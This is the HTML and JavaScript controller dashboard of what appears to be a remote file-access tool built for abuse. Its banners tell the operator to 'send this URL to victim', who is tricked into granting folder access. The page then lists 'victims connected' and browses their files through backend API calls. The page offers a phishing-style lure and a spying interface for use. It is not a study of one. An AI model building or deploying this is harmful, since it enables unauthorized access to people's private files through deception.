<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 WEB MANAGER - Controller Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #eee;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 25px 20px;
            text-align: center;
        }
        .header h1 { font-size: 32px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        
        .url-card {
            background: #1a1a2e;
            margin: 20px;
            padding: 25px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #0f3460;
        }
        .url-card h3 { color: #667eea; margin-bottom: 15px; }
        .url-box {
            background: #0f3460;
            padding: 15px;
            border-radius: 12px;
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
            margin: 15px 0;
        }
        .copy-btn, .qr-btn {
            background: #4CAF50;
            border: none;
            padding: 10px 25px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 14px;
            margin: 5px;
        }
        .qr-btn { background: #2196F3; }
        
        .devices-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
            gap: 20px;
            padding: 20px;
        }
        
        .device-card {
            background: #16213e;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid #0f3460;
        }
        
        .device-header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .device-info h3 { font-size: 18px; margin-bottom: 5px; }
        .device-info p { font-size: 12px; color: #888; }
        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #4CAF50;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .remove-btn {
            background: #f44336;
            border: none;
            padding: 5px 12px;
            border-radius: 6px;
            color: white;
            cursor: pointer;
        }
        
        .device-toolbar {
            padding: 12px 15px;
            background: #0f3460;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .device-toolbar button {
            padding: 6px 14px;
            background: #1a1a2e;
            border: none;
            border-radius: 6px;
            color: white;
            cursor: pointer;
            font-size: 12px;
        }
        .device-toolbar button:hover { background: #667eea; }
        
        .device-path {
            padding: 10px 15px;
            background: #1a1a2e;
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
        }
        
        .file-grid {
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 12px;
        }
        
        .file-item {
            background: #0f3460;
            padding: 12px;
            border-radius: 10px;
            cursor: pointer;
            text-align: center;
            transition: all 0.2s;
        }
        .file-item:hover { background: #1a4a7a; transform: translateY(-3px); }
        .file-icon { font-size: 40px; margin-bottom: 8px; }
        .file-name { font-size: 11px; word-break: break-word; }
        .file-size { font-size: 9px; color: #888; margin-top: 4px; }
        
        .empty-msg { text-align: center; padding: 40px; color: #888; }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #4CAF50;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 1000;
            animation: fadeOut 3s forwards;
        }
        @keyframes fadeOut {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; visibility: hidden; }
        }
        
        @media (max-width: 700px) {
            .devices-grid { grid-template-columns: 1fr; }
            .url-box { font-size: 11px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎮 WEB MANAGER - Controller</h1>
        <p>Send URL → Victim selects folder → You get full access</p>
    </div>

    <div class="url-card">
        <h3>🔗 SEND THIS URL TO VICTIM</h3>
        <div class="url-box" id="shareUrl">Loading...</div>
        <button class="copy-btn" onclick="copyUrl()">📋 Copy URL</button>
        <button class="qr-btn" onclick="showQR()">📱 Show QR Code</button>
        <p style="margin-top: 15px; font-size: 12px; opacity: 0.7;">
            💡 Victim: Open URL → Select a folder → Click ALLOW → You get access
        </p>
    </div>

    <div class="devices-grid" id="devicesGrid">
        <div class="empty-msg">📱 No victims connected yet.<br>Share the URL above</div>
    </div>

    <div id="qrModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1001; justify-content:center; align-items:center;">
        <div style="background:white; padding:20px; border-radius:16px; text-align:center;">
            <h3 style="color:#333; margin-bottom:15px;">Scan QR Code</h3>
            <div id="qrCode"></div>
            <button onclick="closeQR()" style="margin-top:15px; padding:8px 20px; background:#667eea; border:none; border-radius:8px; color:white; cursor:pointer;">Close</button>
        </div>
    </div>

    <script>
        let devices = {};
        let currentUrl = '';
        
        async function getShareUrl() {
            const response = await fetch('/api/get_share_url');
            const data = await response.json();
            currentUrl = data.url;
            document.getElementById('shareUrl').innerHTML = currentUrl;
        }
        
        async function showQR() {
            const modal = document.getElementById('qrModal');
            const qrDiv = document.getElementById('qrCode');
            
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(currentUrl)}`;
            qrDiv.innerHTML = `<img src="${qrUrl}" style="width:200px; height:200px;">`;
            modal.style.display = 'flex';
        }
        
        function closeQR() {
            document.getElementById('qrModal').style.display = 'none';
        }
        
        function copyUrl() {
            navigator.clipboard.writeText(currentUrl);
            showToast('URL copied!');
        }
        
        function showToast(msg) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        async function loadDevices() {
            const response = await fetch('/api/get_devices');
            const data = await response.json();
            devices = data.devices;
            renderDevices();
        }
        
        async function loadFiles(deviceId, path) {
            const response = await fetch(`/api/get_files/${deviceId}?path=${encodeURIComponent(path)}`);
            const data = await response.json();
            if (data.success && devices[deviceId]) {
                devices[deviceId].files = data.files;
                devices[deviceId].currentPath = data.current_path;
                renderDevices();
            }
        }
        
        async function removeDevice(deviceId) {
            if (confirm('Remove this device?')) {
                await fetch(`/api/remove_device/${deviceId}`, { method: 'POST' });
                delete devices[deviceId];
                renderDevices();
            }
        }
        
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }
        
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            const icons = {
                'jpg':'🖼️', 'jpeg':'🖼️', 'png':'🖼️', 'gif':'🖼️',
                'mp4':'🎬', 'mp3':'🎵', 'wav':'🎵',
                'pdf':'📄', 'doc':'📝', 'docx':'📝', 'txt':'📝',
                'zip':'📦', 'rar':'📦', '7z':'📦',
                'py':'🐍', 'js':'📜', 'html':'🌐', 'css':'🎨',
                'exe':'⚙️', 'apk':'📱'
            };
            return icons[ext] || '📄';
        }
        
        function renderDevices() {
            const grid = document.getElementById('devicesGrid');
            const deviceList = Object.values(devices);
            
            if (deviceList.length === 0) {
                grid.innerHTML = '<div class="empty-msg">📱 No victims connected yet.<br>Share the URL above</div>';
                return;
            }
            
            grid.innerHTML = deviceList.map(device => `
                <div class="device-card">
                    <div class="device-header">
                        <div class="device-info">
                            <h3>📱 ${escapeHtml(device.name)}</h3>
                            <p>${escapeHtml(device.type)} | Connected: ${device.time}</p>
                        </div>
                        <div class="status-badge">
                            <div class="status-dot"></div>
                            <button class="remove-btn" onclick="removeDevice('${device.id}')">✕</button>
                        </div>
                    </div>
                    
                    <div class="device-toolbar">
                        <button onclick="loadFiles('${device.id}', '')">🏠 Home</button>
                        <button onclick="loadFiles('${device.id}', '${device.currentPath || ''}')">🔄 Refresh</button>
                    </div>
                    
                    <div class="device-path">
                        📂 ${escapeHtml(device.currentPath || '/')}
                    </div>
                    
                    <div class="file-grid">
                        ${device.files && device.files.length > 0 ? device.files.map(file => `
                            <div class="file-item" onclick="loadFiles('${device.id}', '${escapeHtml(file.path)}')">
                                <div class="file-icon">${file.is_dir ? '📁' : getFileIcon(file.name)}</div>
                                <div class="file-name">${escapeHtml(file.name)}</div>
                                <div class="file-size">${file.is_dir ? '' : formatBytes(file.size)}</div>
                            </div>
                        `).join('') : '<div class="empty-msg" style="grid-column:1/-1;">📂 Click Home to load files</div>'}
                    </div>
                </div>
            `).join('');
        }
        
        getShareUrl();
        loadDevices();
        setInterval(loadDevices, 5000);
    </script>
</body>
</html>
